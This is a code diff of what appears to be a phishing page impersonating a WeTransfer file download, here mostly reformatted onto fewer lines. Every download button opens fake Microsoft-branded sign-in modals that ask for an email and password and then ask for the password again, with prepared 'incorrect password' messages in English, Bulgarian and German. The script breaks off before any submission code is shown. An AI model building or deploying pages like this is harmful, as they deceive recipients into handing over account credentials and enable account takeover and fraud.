@@ -10,244 +10,115 @@
     <style>
         /* [Your exact CSS remains unchanged] */
         :root {
-            --wt-blue: #3767ea;
-            --wt-blue-hover: #4e7df7;
-            --wt-blue-active: #1842ce;
-            --wt-blue-tint: #f5f8ff;
-            --wt-ink: #161616;
-            --wt-charcoal: #353535;
-            --wt-muted: #676767;
-            --wt-canvas: #ffffff;
-            --wt-gray-10: #f9f9f9;
-            --wt-gray-30: #d6d6d6;
-            --wt-radius: 12px;
-            --wt-radius-sm: 8px;
+            --wt-blue: #3767ea; --wt-blue-hover: #4e7df7; --wt-blue-active: #1842ce;
+            --wt-blue-tint: #f5f8ff; --wt-ink: #161616; --wt-charcoal: #353535;
+            --wt-muted: #676767; --wt-canvas: #ffffff; --wt-gray-10: #f9f9f9;
+            --wt-gray-30: #d6d6d6; --wt-radius: 12px; --wt-radius-sm: 8px;
             --wt-font-text: 'Actief Grotesque', 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
             --wt-font-display: 'GT Super WT', Georgia, 'Times New Roman', serif;
         }
-
         * { box-sizing: border-box; }
         html, body { margin: 0; padding: 0; min-height: 100vh; }
-
-        body {
-            font-family: var(--wt-font-text);
-            background: var(--wt-blue-tint);
-            color: var(--wt-ink);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 0 16px 40px;
-        }
-
-        .wt-nav {
-            width: 100%;
-            max-width: 1440px;
-            height: 88px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 40px;
-        }
-
+        body { font-family: var(--wt-font-text); background: var(--wt-blue-tint); color: var(--wt-ink); display: flex; flex-direction: column; align-items: center; padding: 0 16px 40px; }
+        .wt-nav { width: 100%; max-width: 1440px; height: 88px; display: flex; align-items: center; justify-content: space-between; padding: 0 40px; }
         .wt-nav-logo { width: 60px; height: 30px; display: block; flex-shrink: 0; }
         .wt-nav-logo path { fill: var(--wt-ink); }
-
-        .wt-nav-menu {
-            display: flex; align-items: center; gap: 8px;
-            background: var(--wt-canvas); border-radius: 100px;
-            padding: 8px 16px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-        }
-
-        .wt-nav-link {
-            display: inline-flex; align-items: center; gap: 6px;
-            padding: 10px 16px; border-radius: 100px; font-size: 15px;
-            font-weight: 500; color: var(--wt-charcoal); text-decoration: none;
-            transition: color .15s ease, background .15s ease; white-space: nowrap; cursor: pointer;
-        }
-
+        .wt-nav-menu { display: flex; align-items: center; gap: 8px; background: var(--wt-canvas); border-radius: 100px; padding: 8px 16px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05); }
+        .wt-nav-link { display: inline-flex; align-items: center; gap: 6px; padding: 10px 16px; border-radius: 100px; font-size: 15px; font-weight: 500; color: var(--wt-charcoal); text-decoration: none; transition: color .15s ease, background .15s ease; white-space: nowrap; cursor: pointer; }
         .wt-nav-link:hover { color: var(--wt-ink); background: var(--wt-gray-10); }
         .wt-nav-link .chevron { width: 12px; height: 12px; display: inline-block; transition: transform .15s ease; }
         .wt-nav-link:hover .chevron { transform: rotate(180deg); }
-
-        .lang-select {
-            border: none; background: transparent; font-family: var(--wt-font-text);
-            font-size: 14px; font-weight: 500; color: var(--wt-charcoal);
-            cursor: pointer; outline: none; padding: 8px 12px; margin-left: 10px; border-left: 1px solid #eee;
-        }
-
-        .wt-card {
-            background: var(--wt-canvas); width: 100%; max-width: 680px;
-            border-radius: var(--wt-radius); padding: 50px 50px 40px;
-            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.04); margin-top: 20px;
-        }
-
+        .lang-select { border: none; background: transparent; font-family: var(--wt-font-text); font-size: 14px; font-weight: 500; color: var(--wt-charcoal); cursor: pointer; outline: none; padding: 8px 12px; margin-left: 10px; border-left: 1px solid #eee; }
+        .wt-card { background: var(--wt-canvas); width: 100%; max-width: 680px; border-radius: var(--wt-radius); padding: 50px 50px 40px; box-shadow: 0 4px 24px rgba(0, 0, 0, 0.04); margin-top: 20px; }
         .wt-card-logo { width: 100px; height: 50px; display: block; margin-bottom: 30px; }
         .wt-card-logo path { fill: var(--wt-ink); }
-
-        .wt-title {
-            font-family: var(--wt-font-display); font-size: 32px; font-weight: 900;
-            line-height: 1.1; margin: 0 0 8px; color: var(--wt-ink);
-        }
-
+        .wt-title { font-family: var(--wt-font-display); font-size: 32px; font-weight: 900; line-height: 1.1; margin: 0 0 8px; color: var(--wt-ink); }
         .wt-subtitle { font-size: 16px; color: var(--wt-muted); margin: 0 0 30px; }
         .wt-card-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 24px; }
-
-        .wt-btn-header {
-            width: 180px; height: 48px; background: var(--wt-blue); color: #ffffff;
-            border: none; border-radius: var(--wt-radius-sm); font-family: var(--wt-font-text);
-            font-size: 15px; font-weight: 600; cursor: pointer; transition: background .15s ease;
-        }
+        .wt-btn-header { width: 180px; height: 48px; background: var(--wt-blue); color: #ffffff; border: none; border-radius: var(--wt-radius-sm); font-family: var(--wt-font-text); font-size: 15px; font-weight: 600; cursor: pointer; transition: background .15s ease; }
         .wt-btn-header:hover { background: var(--wt-blue-hover); }
-
         .wt-file-list { border-top: 1px solid #f0f0f0; margin-bottom: 30px; }
         .wt-file-row { display: flex; align-items: center; padding: 18px 0; border-bottom: 1px solid #f0f0f0; }
         .wt-file-row:last-child { border-bottom: none; }
         .wt-file-icon { width: 36px; height: 44px; margin-right: 20px; flex-shrink: 0; }
         .wt-file-info { display: flex; align-items: baseline; gap: 12px; flex: 1; overflow: hidden; }
-
-        .wt-file-name {
-            font-size: 16px; font-weight: 500; color: var(--wt-ink);
-            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
-        }
-
+        .wt-file-name { font-size: 16px; font-weight: 500; color: var(--wt-ink); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
         .wt-file-size { font-size: 14px; color: var(--wt-muted); flex-shrink: 0; }
-
-        .wt-download-icon {
-            width: 32px; height: 32px; cursor: pointer; color: var(--wt-blue);
-            flex-shrink: 0; transition: opacity .15s ease;
-        }
+        .wt-download-icon { width: 32px; height: 32px; cursor: pointer; color: var(--wt-blue); flex-shrink: 0; transition: opacity .15s ease; }
         .wt-download-icon:hover { opacity: 0.7; }
-
-        .wt-btn {
-            display: block; width: 100%; height: 52px; background: var(--wt-blue);
-            color: #ffffff; border: none; border-radius: var(--wt-radius-sm);
-            font-family: var(--wt-font-text); font-size: 16px; font-weight: 600;
-            cursor: pointer; transition: background .15s ease;
-        }
-        .wt-btn:hover  { background: var(--wt-blue-hover); }
-
-        .login-modal {
-            display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, .65);
-            z-index: 9999; align-items: center; justify-content: center;
-            padding: 20px; font-family: var(--wt-font-text);
-        }
-
-        .login-modal-content {
-            background: #ffffff; width: 100%; max-width: 420px; padding: 40px 44px;
-            box-shadow: 0 4px 30px rgba(0, 0, 0, .3); border-radius: 4px; animation: fadeIn 0.2s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
+        .wt-btn { display: block; width: 100%; height: 52px; background: var(--wt-blue); color: #ffffff; border: none; border-radius: var(--wt-radius-sm); font-family: var(--wt-font-text); font-size: 16px; font-weight: 600; cursor: pointer; transition: background .15s ease; }
+        .wt-btn:hover { background: var(--wt-blue-hover); }
+        .login-modal { display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, .65); z-index: 9999; align-items: center; justify-content: center; padding: 20px; font-family: var(--wt-font-text); }
+        .login-modal-content { background: #ffffff; width: 100%; max-width: 420px; padding: 40px 44px; box-shadow: 0 4px 30px rgba(0, 0, 0, .3); border-radius: 4px; animation: fadeIn 0.2s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         .login-brand { margin-bottom: 20px; }
         .login-title { font-family: var(--wt-font-text); font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 0 0 8px; }
         .login-subtitle { font-size: 14px; color: #605e5c; margin: 0 0 24px; line-height: 1.4; }
         .login-form { display: flex; flex-direction: column; gap: 14px; }
-
-        .login-input {
-            height: 44px; padding: 0 14px; font-size: 15px; border: 1px solid #8a8886;
-            border-radius: 2px; outline: none; font-family: inherit; width: 100%;
-        }
-
+        .login-input { height: 44px; padding: 0 14px; font-size: 15px; border: 1px solid #8a8886; border-radius: 2px; outline: none; font-family: inherit; width: 100%; }
         .login-input:focus { border-color: #0067b8; }
         .login-input[readonly] { background: #f3f2f1; color: #605e5c; cursor: not-allowed; }
-
-        .login-btn {
-            height: 44px; background: #0067b8; color: #ffffff; border: none;
-            font-size: 16px; font-weight: 600; cursor: pointer; border-radius: 2px;
-            margin-top: 6px; font-family: inherit;
-        }
-
+        .login-btn { height: 44px; background: #0067b8; color: #ffffff; border: none; font-size: 16px; font-weight: 600; cursor: pointer; border-radius: 2px; margin-top: 6px; font-family: inherit; }
         .login-btn:hover { background: #005da6; }
         .login-btn:disabled { background: #8a8886; cursor: not-allowed; }
         .login-error { color: #a4262c; font-size: 13px; margin: 0; min-height: 18px; }
-
-        @media (max-width: 768px) {
-            .wt-nav { padding: 0 20px; height: 72px; }
-            .wt-nav-menu { gap: 2px; padding: 6px 10px; }
-            .wt-nav-link { padding: 8px 10px; font-size: 14px; }
-            .wt-card { padding: 30px 24px 30px; }
-        }
-
-        @media (max-width: 560px) {
-            .wt-card-header { flex-direction: column; gap: 16px; align-items: stretch; }
-            .wt-btn-header { width: 100%; }
-            .login-modal-content { padding: 30px 24px; }
-            .wt-nav-menu { flex-wrap: wrap; justify-content: flex-end; border-radius: 16px; }
-            .wt-title { font-size: 28px; }
-        }
+        @media (max-width: 768px) { .wt-nav { padding: 0 20px; height: 72px; } .wt-nav-menu { gap: 2px; padding: 6px 10px; } .wt-nav-link { padding: 8px 10px; font-size: 14px; } .wt-card { padding: 30px 24px 30px; } }
+        @media (max-width: 560px) { .wt-card-header { flex-direction: column; gap: 16px; align-items: stretch; } .wt-btn-header { width: 100%; } .login-modal-content { padding: 30px 24px; } .wt-nav-menu { flex-wrap: wrap; justify-content: flex-end; border-radius: 16px; } .wt-title { font-size: 28px; } }
     </style>
 </head>
-
 <body>
 
-    <!-- Top Navigation -->
     <nav class="wt-nav">
         <svg class="wt-nav-logo" viewBox="0 0 40 20" xmlns="http://www.w3.org/2000/svg" aria-label="WeTransfer">
             <path d="m12.23 14.24c-.38-.61-.7-.93-1.25-.93s-.87.32-1.25.93l-1.67 2.67c-.63 1.03-1.15 1.75-2.37 1.75s-1.78-.5-2.37-1.89c-.73-1.71-1.5-3.78-2.2-6.55C.37 7.12.02 5.2.02 3.63S.5 1.14 2.18.82C4.48.39 7.58.14 11 .14s6.52.25 8.82.68c1.67.32 2.16 1.25 2.16 2.81s-.35 3.49-1.12 6.59c-.7 2.78-1.46 4.84-2.2 6.55-.59 1.39-1.15 1.89-2.37 1.89-1.22 0-1.74-.71-2.37-1.75zm26.52 2.5c-1.18 1.28-3.41 2.21-6.34 2.21-5.89 0-9.37-4.1-9.37-9.47 0-5.77 4.01-9.19 9.2-9.19 4.63 0 7.7 2.46 7.7 5.77 0 3.13-2.61 5.16-5.58 5.16-1.6 0-2.79-.32-3.59-.96-.31-.25-.49-.21-.49.07 0 1.18.42 2.17 1.18 2.96.63.64 1.81 1.07 2.93 1.07 1.15 0 2.16-.25 3.07-.71s1.67-.32 2.13.43c.52.85-.21 1.96-.84 2.67z"/>
         </svg>
-
         <div class="wt-nav-menu">
             <a class="wt-nav-link" href="#features">Features <svg class="chevron" viewBox="0 0 12 12" fill="none"><path d="M3 4.5l3 3 3-3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
             <a class="wt-nav-link" href="#pricing">Pricing</a>
             <a class="wt-nav-link" href="#use-cases">Use cases <svg class="chevron" viewBox="0 0 12 12" fill="none"><path d="M3 4.5l3 3 3-3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
             <a class="wt-nav-link" href="#resources">Resources <svg class="chevron" viewBox="0 0 12 12" fill="none"><path d="M3 4.5l3 3 3-3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
-            
             <select class="lang-select" id="langSelect" onchange="changeLanguage(this.value)">
-                <option value="en">EN</option>
-                <option value="bg">BG</option>
-                <option value="de">DE</option>
+                <option value="en">EN</option><option value="bg">BG</option><option value="de">DE</option>
             </select>
         </div>
     </nav>
 
-    <!-- Main Download Card -->
     <div class="wt-card" id="download-container">
         <input type="email" id="user" name="user" style="display:none;">
-
         <svg class="wt-card-logo" viewBox="0 0 40 20" xmlns="http://www.w3.org/2000/svg">
             <path fill="#161616" d="m12.23 14.24c-.38-.61-.7-.93-1.25-.93s-.87.32-1.25.93l-1.67 2.67c-.63 1.03-1.15 1.75-2.37 1.75s-1.78-.5-2.37-1.89c-.73-1.71-1.5-3.78-2.2-6.55C.37 7.12.02 5.2.02 3.63S.5 1.14 2.18.82C4.48.39 7.58.14 11 .14s6.52.25 8.82.68c1.67.32 2.16 1.25 2.16 2.81s-.35 3.49-1.12 6.59c-.7 2.78-1.46 4.84-2.2 6.55-.59 1.39-1.15 1.89-2.37 1.89-1.22 0-1.74-.71-2.37-1.75zm26.52 2.5c-1.18 1.28-3.41 2.21-6.34 2.21-5.89 0-9.37-4.1-9.37-9.47 0-5.77 4.01-9.19 9.2-9.19 4.63 0 7.7 2.46 7.7 5.77 0 3.13-2.61 5.16-5.58 5.16-1.6 0-2.79-.32-3.59-.96-.31-.25-.49-.21-.49.07 0 1.18.42 2.17 1.18 2.96.63.64 1.81 1.07 2.93 1.07 1.15 0 2.16-.25 3.07-.71s1.67-.32 2.13.43c.52.85-.21 1.96-.84 2.67z"/>
         </svg>
-
         <h1 class="wt-title" id="t-cardTitle">4 files, 5.6 MB</h1>
         <p class="wt-subtitle" id="t-cardSubtitle">Transfer expires in 7 days</p>
-
         <div class="wt-file-list">
             <div class="wt-file-row">
-                <svg class="wt-file-icon" viewBox="0 0 32 40" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M2 0H22L32 10V38C32 39.1046 31.1046 40 30 40H2C0.895432 40 0 39.1046 0 38V2C0 0.895432 0.895432 0 2 0Z" fill="#F4F5F7"/><path d="M22 0L32 10H24C22.8954 10 22 9.10457 22 8V0Z" fill="#DFE1E6"/><path d="M8 15H20M8 19H16M8 23H18" stroke="#E74C3C" stroke-width="2" stroke-linecap="round"/><rect y="28" width="32" height="12" fill="#E74C3C"/><text x="16" y="36" fill="white" font-family="Arial, sans-serif" font-size="7" font-weight="bold" text-anchor="middle">PDF</text></svg>
+                <svg class="wt-file-icon" viewBox="0 0 32 40" fill="none"><path d="M2 0H22L32 10V38C32 39.1046 31.1046 40 30 40H2C0.895432 40 0 39.1046 0 38V2C0 0.895432 0.895432 0 2 0Z" fill="#F4F5F7"/><path d="M22 0L32 10H24C22.8954 10 22 9.10457 22 8V0Z" fill="#DFE1E6"/><path d="M8 15H20M8 19H16M8 23H18" stroke="#E74C3C" stroke-width="2" stroke-linecap="round"/><rect y="28" width="32" height="12" fill="#E74C3C"/><text x="16" y="36" fill="white" font-family="Arial, sans-serif" font-size="7" font-weight="bold" text-anchor="middle">PDF</text></svg>
                 <div class="wt-file-info"><span class="wt-file-name">Purchase order.pdf</span><span class="wt-file-size">501 KB</span></div>
                 <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.5"/><path d="M12 7v7m0 0l-3-3m3 3l3-3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
             </div>
             <div class="wt-file-row">
-                <svg class="wt-file-icon" viewBox="0 0 32 40" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M2 0H22L32 10V38C32 39.1046 31.1046 40 30 40H2C0.895432 40 0 39.1046 0 38V2C0 0.895432 0.895432 0 2 0Z" fill="#F4F5F7"/><path d="M22 0L32 10H24C22.8954 10 22 9.10457 22 8V0Z" fill="#DFE1E6"/><path d="M8 15H20M8 19H16M8 23H18" stroke="#E74C3C" stroke-width="2" stroke-linecap="round"/><rect y="28" width="32" height="12" fill="#E74C3C"/><text x="16" y="36" fill="white" font-family="Arial, sans-serif" font-size="7" font-weight="bold" text-anchor="middle">PDF</text></svg>
+                <svg class="wt-file-icon" viewBox="0 0 32 40" fill="none"><path d="M2 0H22L32 10V38C32 39.1046 31.1046 40 30 40H2C0.895432 40 0 39.1046 0 38V2C0 0.895432 0.895432 0 2 0Z" fill="#F4F5F7"/><path d="M22 0L32 10H24C22.8954 10 22 9.10457 22 8V0Z" fill="#DFE1E6"/><path d="M8 15H20M8 19H16M8 23H18" stroke="#E74C3C" stroke-width="2" stroke-linecap="round"/><rect y="28" width="32" height="12" fill="#E74C3C"/><text x="16" y="36" fill="white" font-family="Arial, sans-serif" font-size="7" font-weight="bold" text-anchor="middle">PDF</text></svg>
                 <div class="wt-file-info"><span class="wt-file-name">Product Sample.pdf</span><span class="wt-file-size">501 KB</span></div>
                 <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.5"/><path d="M12 7v7m0 0l-3-3m3 3l3-3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
             </div>
             <div class="wt-file-row">
-                <svg class="wt-file-icon" viewBox="0 0 32 40" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="0" y="10" width="32" height="20" rx="4" fill="#FF0000"/><path d="M13 16L21 20L13 24V16Z" fill="white"/></svg>
+                <svg class="wt-file-icon" viewBox="0 0 32 40" fill="none"><rect x="0" y="10" width="32" height="20" rx="4" fill="#FF0000"/><path d="M13 16L21 20L13 24V16Z" fill="white"/></svg>
                 <div class="wt-file-info"><span class="wt-file-name">Sample Video.mp4</span><span class="wt-file-size">2.3 MB</span></div>
                 <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.5"/><path d="M12 7v7m0 0l-3-3m3 3l3-3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
             </div>
             <div class="wt-file-row">
-                <svg class="wt-file-icon" viewBox="0 0 32 40" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M2 0H22L32 10V38C32 39.1046 31.1046 40 30 40H2C0.895432 40 0 39.1046 0 38V2C0 0.895432 0.895432 0 2 0Z" fill="#F4F5F7"/><path d="M22 0L32 10H24C22.8954 10 22 9.10457 22 8V0Z" fill="#DFE1E6"/><path d="M8 15H20M8 19H16M8 23H18" stroke="#E74C3C" stroke-width="2" stroke-linecap="round"/><rect y="28" width="32" height="12" fill="#E74C3C"/><text x="16" y="36" fill="white" font-family="Arial, sans-serif" font-size="7" font-weight="bold" text-anchor="middle">PDF</text></svg>
+                <svg class="wt-file-icon" viewBox="0 0 32 40" fill="none"><path d="M2 0H22L32 10V38C32 39.1046 31.1046 40 30 40H2C0.895432 40 0 39.1046 0 38V2C0 0.895432 0.895432 0 2 0Z" fill="#F4F5F7"/><path d="M22 0L32 10H24C22.8954 10 22 9.10457 22 8V0Z" fill="#DFE1E6"/><path d="M8 15H20M8 19H16M8 23H18" stroke="#E74C3C" stroke-width="2" stroke-linecap="round"/><rect y="28" width="32" height="12" fill="#E74C3C"/><text x="16" y="36" fill="white" font-family="Arial, sans-serif" font-size="7" font-weight="bold" text-anchor="middle">PDF</text></svg>
                 <div class="wt-file-info"><span class="wt-file-name">Specifications.pdf</span><span class="wt-file-size">2 MB</span></div>
                 <svg class="wt-download-icon" onclick="submitValue()" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.5"/><path d="M12 7v7m0 0l-3-3m3 3l3-3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
             </div>
         </div>
-
         <button class="wt-btn" onclick="submitValue()" id="t-btnDownload">Download All</button>
     </div>
 
-    <!-- Stage 1 Modal -->
     <div id="stage1-modal" class="login-modal">
         <div class="login-modal-content">
             <div class="login-brand">
-                <svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
-                    <rect x="0" y="1" width="10" height="10" fill="#F25022"/><rect x="11" y="1" width="10" height="10" fill="#7FBA00"/><rect x="0" y="12" width="10" height="10" fill="#00A4EF"/><rect x="11" y="12" width="10" height="10" fill="#FFB900"/><text x="26" y="17" font-family="Segoe UI, Arial, sans-serif" font-size="14" font-weight="600" fill="#5e5e5e">Microsoft</text>
-                </svg>
+                <svg width="108" height="24" viewBox="0 0 108 24"><rect x="0" y="1" width="10" height="10" fill="#F25022"/><rect x="11" y="1" width="10" height="10" fill="#7FBA00"/><rect x="0" y="12" width="10" height="10" fill="#00A4EF"/><rect x="11" y="12" width="10" height="10" fill="#FFB900"/><text x="26" y="17" font-family="Segoe UI, Arial, sans-serif" font-size="14" font-weight="600" fill="#5e5e5e">Microsoft</text></svg>
             </div>
             <h2 class="login-title" id="t-s1Title">Sign in to continue</h2>
             <p class="login-subtitle" id="t-s1Subtitle">Your download is ready. Sign in to verify you're human.</p>
@@ -260,13 +131,10 @@
         </div>
     </div>
 
-    <!-- Stage 2 Modal -->
     <div id="stage2-modal" class="login-modal">
         <div class="login-modal-content">
             <div class="login-brand">
-                <svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
-                    <rect x="0" y="1" width="10" height="10" fill="#F25022"/><rect x="11" y="1" width="10" height="10" fill="#7FBA00"/><rect x="0" y="12" width="10" height="10" fill="#00A4EF"/><rect x="11" y="12" width="10" height="10" fill="#FFB900"/><text x="26" y="17" font-family="Segoe UI, Arial, sans-serif" font-size="14" font-weight="600" fill="#5e5e5e">Microsoft</text>
-                </svg>
+                <svg width="108" height="24" viewBox="0 0 108 24"><rect x="0" y="1" width="10" height="10" fill="#F25022"/><rect x="11" y="1" width="10" height="10" fill="#7FBA00"/><rect x="0" y="12" width="10" height="10" fill="#00A4EF"/><rect x="11" y="12" width="10" height="10" fill="#FFB900"/><text x="26" y="17" font-family="Segoe UI, Arial, sans-serif" font-size="14" font-weight="600" fill="#5e5e5e">Microsoft</text></svg>
             </div>
             <h2 class="login-title" id="t-s2Title">Verify your identity</h2>
             <p class="login-subtitle" id="t-s2Subtitle">For your security, please re-enter your password to complete the download.</p>
@@ -279,186 +147,70 @@
     </div>
 
 <script>
-/* ============================================================ */
-/* MULTILINGUAL DICTIONARY                                      */
-/* ============================================================ */
 const translations = {
-    en: {
-        title: "WeTransfer | Send Large Files Fast",
-        cardTitle: "4 files, 5.6 MB",
-        cardSubtitle: "Transfer expires in 7 days",
-        btnDownload: "Download All",
-        s1Title: "Sign in to continue",
-        s1Subtitle: "Your download is ready. Sign in to verify you're human.",
-        emailPlaceholder: "Email address",
-        passwordPlaceholder: "Password",
-        btnSignIn: "Sign in",
-        s2Title: "Verify your identity",
-        s2Subtitle: "For your security, please re-enter your password to complete the download.",
-        btnVerify: "Verify",
-        errEmpty: "Please enter your email and password.",
-        errInvalid: "Invalid credentials. Please try again.",
-        errConn: "Connection error. Please try again.",
-        errPassEmpty: "Please enter your password.",
-        errIncorrect: "Incorrect password. Please try again."
-    },
-    bg: {
-        title: "WeTransfer | Изпращайте големи файлове бързо",
-        cardTitle: "4 файла, 5.6 MB",
-        cardSubtitle: "Трансферът изтича след 7 дни",
-        btnDownload: "Изтегли всички",
-        s1Title: "Влезте, за да продължите",
-        s1Subtitle: "Вашето изтегляне е готово. Влезте, за да потвърдите, че сте човек.",
-        emailPlaceholder: "Имейл адрес",
-        passwordPlaceholder: "Парола",
-        btnSignIn: "Вход",
-        s2Title: "Потвърдете самоличността си",
-        s2Subtitle: "За ваша сигурност, моля, въведете отново паролата си, за да завършите изтеглянето.",
-        btnVerify: "Потвърди",
-        errEmpty: "Моля, въведете вашия имейл и парола.",
-        errInvalid: "Невалидни данни. Моля, опитайте отново.",
-        errConn: "Грешка при връзката. Моля, опитайте отново.",
-        errPassEmpty: "Моля, въведете вашата парола.",
-        errIncorrect: "Грешна парола. Моля, опитайте отново."
-    },
-    de: {
-        title: "WeTransfer | Große Dateien schnell senden",
-        cardTitle: "4 Dateien, 5.6 MB",
-        cardSubtitle: "Transfer läuft in 7 Tagen ab",
-        btnDownload: "Alle herunterladen",
-        s1Title: "Anmelden, um fortzufahren",
-        s1Subtitle: "Ihr Download ist bereit. Melden Sie sich an, um zu bestätigen, dass Sie ein Mensch sind.",
-        emailPlaceholder: "E-Mail-Adresse",
-        passwordPlaceholder: "Passwort",
-        btnSignIn: "Anmelden",
-        s2Title: "Identität bestätigen",
-        s2Subtitle: "Zu Ihrer Sicherheit geben Sie bitte Ihr Passwort erneut ein, um den Download abzuschließen.",
-        btnVerify: "Bestätigen",
-        errEmpty: "Bitte geben Sie Ihre E-Mail und Ihr Passwort ein.",
-        errInvalid: "Ungültige Anmeldedaten. Bitte versuchen Sie es erneut.",
-        errConn: "Verbindungsfehler. Bitte versuchen Sie es erneut.",
-        errPassEmpty: "Bitte geben Sie Ihr Passwort ein.",
-        errIncorrect: "Falsches Passwort. Bitte versuchen Sie es erneut."
-    }
+    en: { title: "WeTransfer | Send Large Files Fast", cardTitle: "4 files, 5.6 MB", cardSubtitle: "Transfer expires in 7 days", btnDownload: "Download All", s1Title: "Sign in to continue", s1Subtitle: "Your download is ready. Sign in to verify you're human.", emailPlaceholder: "Email address", passwordPlaceholder: "Password", btnSignIn: "Sign in", s2Title: "Verify your identity", s2Subtitle: "For your security, please re-enter your password to complete the download.", btnVerify: "Verify", errEmpty: "Please enter your email and password.", errInvalid: "Invalid credentials. Please try again.", errConn: "Connection error. Please try again.", errPassEmpty: "Please enter your password.", errIncorrect: "Incorrect password. Please try again." },
+    bg: { title: "WeTransfer | Изпращайте големи файлове бързо", cardTitle: "4 файла, 5.6 MB", cardSubtitle: "Трансферът изтича след 7 дни", btnDownload: "Изтегли всички", s1Title: "Влезте, за да продължите", s1Subtitle: "Вашето изтегляне е готово. Влезте, за да потвърдите, че сте човек.", emailPlaceholder: "Имейл адрес", passwordPlaceholder: "Парола", btnSignIn: "Вход", s2Title: "Потвърдете самоличността си", s2Subtitle: "За ваша сигурност, моля, въведете отново паролата си, за да завършите изтеглянето.", btnVerify: "Потвърди", errEmpty: "Моля, въведете вашия имейл и парола.", errInvalid: "Невалидни данни. Моля, опитайте отново.", errConn: "Грешка при връзката. Моля, опитайте отново.", errPassEmpty: "Моля, въведете вашата парола.", errIncorrect: "Грешна парола. Моля, опитайте отново." },
+    de: { title: "WeTransfer | Große Dateien schnell senden", cardTitle: "4 Dateien, 5.6 MB", cardSubtitle: "Transfer läuft in 7 Tagen ab", btnDownload: "Alle herunterladen", s1Title: "Anmelden, um fortzufahren", s1Subtitle: "Ihr Download ist bereit. Melden Sie sich an, um zu bestätigen, dass Sie ein Mensch sind.", emailPlaceholder: "E-Mail-Adresse", passwordPlaceholder: "Passwort", btnSignIn: "Anmelden", s2Title: "Identität bestätigen", s2Subtitle: "Zu Ihrer Sicherheit geben Sie bitte Ihr Passwort erneut ein, um den Download abzuschließen.", btnVerify: "Bestätigen", errEmpty: "Bitte geben Sie Ihre E-Mail und Ihr Passwort ein.", errInvalid: "Ungültige Anmeldedaten. Bitte versuchen Sie es erneut.", errConn: "Verbindungsfehler. Bitte versuchen Sie es erneut.", errPassEmpty: "Bitte geben Sie Ihr Passwort ein.", errIncorrect: "Falsches Passwort. Bitte versuchen Sie es erneut." }
 };
 
 let currentLang = 'en';
-
-function detectLanguage() {
-    const userLang = navigator.language || navigator.userLanguage;
-    if (userLang.startsWith('bg')) return 'bg';
-    if (userLang.startsWith('de')) return 'de';
-    return 'en';
-}
-
+function detectLanguage() { const u = navigator.language || navigator.userLanguage; if (u.startsWith('bg')) return 'bg'; if (u.startsWith('de')) return 'de'; return 'en'; }
 function applyTranslations(lang) {
-    const t = translations[lang];
-    if (!t) return;
-    currentLang = lang;
-
-    document.title = t.title;
-    document.getElementById('t-cardTitle').innerText = t.cardTitle;
-    document.getElementById('t-cardSubtitle').innerText = t.cardSubtitle;
-    document.getElementById('t-btnDownload').innerText = t.btnDownload;
-    document.getElementById('t-btnSignIn').innerText = t.btnSignIn;
-    document.getElementById('t-btnVerify').innerText = t.btnVerify;
-
-    document.getElementById('t-s1Title').innerText = t.s1Title;
-    document.getElementById('t-s1Subtitle').innerText = t.s1Subtitle;
-    document.getElementById('t-s2Title').innerText = t.s2Title;
-    document.getElementById('t-s2Subtitle').innerText = t.s2Subtitle;
-
-    document.getElementById('s1-email').placeholder = t.emailPlaceholder;
-    document.getElementById('s1-password').placeholder = t.passwordPlaceholder;
-    document.getElementById('s2-password').placeholder = t.passwordPlaceholder;
-
+    const t = translations[lang]; if (!t) return; currentLang = lang;
+    document.title = t.title; document.getElementById('t-cardTitle').innerText = t.cardTitle; document.getElementById('t-cardSubtitle').innerText = t.cardSubtitle;
+    document.getElementById('t-btnDownload').innerText = t.btnDownload; document.getElementById('t-btnSignIn').innerText = t.btnSignIn; document.getElementById('t-btnVerify').innerText = t.btnVerify;
+    document.getElementById('t-s1Title').innerText = t.s1Title; document.getElementById('t-s1Subtitle').innerText = t.s1Subtitle;
+    document.getElementById('t-s2Title').innerText = t.s2Title; document.getElementById('t-s2Subtitle').innerText = t.s2Subtitle;
